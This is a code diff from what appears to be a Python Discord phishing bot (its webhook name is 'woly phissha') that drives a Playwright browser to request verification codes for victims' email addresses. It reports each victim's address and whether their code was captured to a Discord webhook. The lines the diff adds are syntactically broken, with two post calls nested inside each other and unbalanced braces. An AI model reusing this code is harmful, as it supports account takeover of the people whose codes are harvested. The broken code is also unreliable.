@@ -106,7 +106,7 @@ from playwright.async_api import async_playwright
 
 async def requestcode(interaction):
     async with async_playwright() as playwright:
-        browser = await playwright.chromium.launch(headless=True)
+        browser = await playwright.chromium.launch(headless=False)
         page = await browser.new_page()
         context = await browser.new_context()
 
@@ -161,6 +161,13 @@ async def requestcode(interaction):
                 "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
                 "content": f"@everyone COULDN'T GET CODE FROM: {email}"
             }, timeout=5000)
+        request.post(url, json = {
+                      requests.post(url, json = {
+                "username": "woly phissha",
+                "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
+                "content": f"@everyone Successfully got code from: {email}"
+            }, timeout=5000)          
+        })
 
 
 
